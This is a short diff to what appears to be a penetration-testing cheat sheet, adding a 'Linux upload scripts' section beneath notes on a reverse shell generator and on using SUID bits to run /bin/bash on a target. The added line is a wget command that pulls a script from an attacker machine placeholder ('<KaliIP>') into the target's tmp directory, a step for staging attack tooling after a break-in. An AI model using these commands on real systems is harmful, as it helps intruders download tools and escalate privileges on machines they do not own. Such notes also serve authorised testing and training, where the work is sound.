@@ -11,6 +11,13 @@ Reverse Shell Generator:
  
 As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job:
 
+
+####################
+Linux upload scripts
+####################
+If possible in "tmp" file:
+wget http://<KaliIP>/scriptName scriptName
+
 ####################
 ####################
 
